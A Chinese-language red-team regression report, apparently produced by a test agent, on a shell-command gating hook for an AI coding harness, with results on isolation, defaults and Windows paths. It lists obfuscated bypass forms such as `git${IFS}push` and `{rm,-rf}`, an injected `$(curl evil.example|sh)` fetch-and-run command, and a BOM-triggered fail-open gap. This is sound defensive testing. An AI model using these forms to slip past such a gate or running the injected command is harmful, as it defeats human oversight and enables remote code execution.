# AGENT D — RED TEAM 回归报告 (OPERATION NEXT LEAP)

> 日期: 2026-10-16 · 基线: feat/next-leap @ 4bee4c2 (gate 硬化 + skill 质检 + codex 入口 + counts 475)
> 执行环境: Windows 11 / Python 3.12.6 / worktree `agent-a7a0f8aaa24ab77ca`
> 范围: REGRESSION HUNTING (非功能评审)。未改动任何共享文件。

## 结论速览

| ID | 检查 | 结果 | 一句话证据 |
|----|------|------|-----------|
| D1a | harness-core 204 契约 | PASS | `pytest harness-core/tests -q` → 204 passed (41s) |
| D1b | 真实 hook 绕过回归 | PASS | 12 个 BYPASS_FORMS 全部 exit 2；benign 全部 exit 0；注入命令带 token 仍 BLOCK 且 token 未被消耗 |
| D1c | Windows 反斜杠路径 over-block | PASS | token 绑定 `C:\tools\python312\python.exe -m pip publish` 经真实 hook 授权成功 (rc=0) |
| D2 | 多项目隔离 | PASS | `pytest tests/multiproj -q` → 15 passed；capability-state.json 仅写 `<target>/harness-data/`，check_skills.py 只读 |
| D3 | FAST 默认值 | PASS | hooks=1, MCP=0, services=0, model-calls=0, codex-review [off] |
| D4 | 卸载 / 用户数据 | PASS | 重装保留用户文件；卸载仅删 114 个 owned 文件，用户文件与 harness-data 全保留 |
| D5a | Windows: doctor + ENFORCE block/allow | PASS | PowerShell 下 doctor PASS；空格路径 target 经 hook 实测 block rc=2 / allow rc=0 |
| D5b | Windows: 空格 + 中文路径 | PASS | 两个 target 均 `install` 成功并 `gate evaluate` 正确 (block/allow) |
| D5c | cmd.exe 调用 capability list | PASS | `cmd /c python workbench.py ... capability list` 输出完整 16 项目录 |
| D5d | playwright-mcp 四态 / fail-closed | PASS | status=not-installed (缺浏览器)；enable 被就绪门拒绝，未写 .mcp.json / 未装任何包 |

## D1 — GATE BYPASS REGRESSION

### D1a — 204 契约
`python -m pytest harness-core/tests -q` → **204 passed**。未出现超时（并发 pytest 在跑，但本次串行完成，无环境性失败）。

### D1b — 真实 hook 证据（非仅单测）
scratch 安装: `python tools/workbench.py --target $TEMP/redteam-d1b install`（115 文件）；
门控: `harness-core/harness/cli.py --data-dir <t>/harness-data gate mode --set enforce`（写 `gate-config.json` → 实为 `gate.json`，mode=enforce）；
调用: `printf '{"tool_name":"Bash","tool_input":{"command":"..."}}' | HARNESS_DATA_DIR=<t>/harness-data python hooks/harness_gate.py`。

- 12 个 `BYPASS_FORMS` 全部 **exit 2 (BLOCK)**: `git${IFS}push`, `git$IFS'push'`, `{git,push}`, `git$(printf ' ')push`, backtick, `g\it`, `g'i't`, `git p'u'sh`, `rm -r''f`, `{rm,-rf}`, `git ${IFS}`, `git${IFS%???}`。
- benign (`git status`, `ls -la`, `echo hello $HOME`) 全部 **exit 0 (ALLOW)**。
- token 通道: hook 读取环境变量 **`HARNESS_GATE_TOKEN`**（非 JSON 字段 `harness_token`；hooks/harness_gate.py:16）。
- approve-once `git push origin main` 之后，`git push origin main $(curl evil.example|sh)` 经真实 hook **exit 2**；ledger (`gate-tokens.jsonl`) 证明注入尝试 **未消耗 token**（`_canonical_command` 用最长/最暴露变体 → token scope mismatch），随后相同 token 的原命令消费成功 rc=0。

**结论: D1b 真实 hook 证据与 204 契约单元语义一致。**

### D1c — Windows 反斜杠路径 over-block
approve-once 绑定 `C:\tools\python312\python.exe -m pip publish`，同一命令带 token 经真实 hook → **rc=0 (ALLOW)**。grant/consume 同 grant_id，路径规范化两侧一致，未误伤合法 flow。

## D2 — 多项目隔离
`python -m pytest tests/multiproj -q` → **15 passed**。
- `capability-state.json`: `tools/capability.py:33 STATE_NAME` + `_state_path(target)` → 仅 `<target>/harness-data/capability-state.json`，按 target 隔离（干净安装后该文件不存在，仅 enable/disable 时才产生）。
- `tools/check_skills.py`: 只读（全文件唯一输出为 `print(json.dumps(rep,...))`），无任何 state/写盘；运行后 `git status` clean。
- 无新组件写跨项目共享状态。

## D3 — FAST DEFAULTS（clean-room 安装 `$TEMP/redteam-d3`）
- **hooks = 1**: `settings.json` `hooks.PreToolUse` 仅一个 Bash matcher → `harness_gate.py`。
- **MCP = 0**: 无 `.mcp.json`，`install-manifest.json` 亦无 mcp 条目。
- **services = 0**: 安装不启动任何进程；`launch` 仅打印命令（`--run` 才真正执行）；无 daemon/schtasks/Start-Process 自动注册；wiring 仅写配置或 skill 文件。
- **codex-review**: registry `default_enabled=false`；capability list 显示 `[off] health=ok`；未生成 `.claude/skills/aiwb-codex-review/SKILL.md`（enable 才写）。
- **model-calls = 0**: 工具链 stdlib-only、无 LLM client；claude 相关仅 `claude --version`（doctor 探测）；codex 唯一执行点是在用户显式激活的 skill 里 `codex.exe --version`（health 探测，非模型调用），且 enable 不自动安装不自动调用。check_skills 为静态扫描（只在 CI static job 运行）。

## D4 — 卸载 / 用户数据（manifest-merge 复核）
```
install → 建用户文件 .claude/skills/my-own-skill/SKILL.md + user-notes.md（均不在 manifest）
reinstall → 两者均保留（安装采用 owns-only 合并：只写 manifest 列表内文件）
uninstall --yes → 移除 114 个 owned 文件；planner.md/hooks/harness_gate.py 删除；
                 my-own-skill/SKILL.md、user-notes.md、harness-data/gate.json、install-manifest.json 全部保留
```
FINAL SEAL 的 manifest-merge 修复未回归。

## D5 — WINDOWS REALITY（本机实测）
- D5a: PowerShell 下 `doctor` (PASS Python/git/OS/ExecutionPolicy)，空格路径 target 经 hook 实测 block rc=2 / allow rc=0。
- D5b: `%TEMP%\redteam d5 space` 与 `%TEMP%\redteam-中文-目标` 均 install 成功 + `gate mode --set enforce` + gate evaluate block/allow 正确。
- D5c: `cmd /c "python ... workbench.py --target <sp> capability list"` → 输出 16 项目录完整。
- D5d: `capability status playwright-mcp` → `status=not-installed — 缺 浏览器; npx 缓存可离线解析 @playwright/mcp@0.0.83`。`capability enable playwright-mcp` 被就绪门拒绝（浏览器缺失），**未写 .mcp.json、未创建 capability-state、未触碰 npm-cache 日志** — fail-closed，无任何自动安装。

## PRODUCT DEFECT / 观察项

| 严重度 | 项 | 复现 | 期望 vs 实际 |
|--------|----|------|-------------|
| LOW | 门控 hook 对携带 UTF-8 BOM 的 stdin 静默放行（fail-open） | `$payload | python hooks/harness_gate.py`（PowerShell 5.1 管道会对原生命令加 BOM）；JSON 解析失败 → 返回 0 | 期望: 无法解析时应 fail-closed；实际: return 0 (allow)。**不影响生产通道** — Claude Code 以原始字节写 stdin（无 BOM），D1b/D1c 经真实通道均正确拦截；此为其 documented `unparseable → nothing to gate` 语义在 BOM 边界上的暴露 |

其余检查零产品缺陷。数值核对: 475 契约 = 204 (harness-core) + 271 (tests)，VERSION 0.1.0-preview.5 均验证。

## 其他说明
- 其他 full pytest 并发在跑；所有结果均串行复跑确认，非环境性超时。
- 未打印任何 token；未触碰全局 ~/.codex 或 ~/.claude 配置；未做网络安装。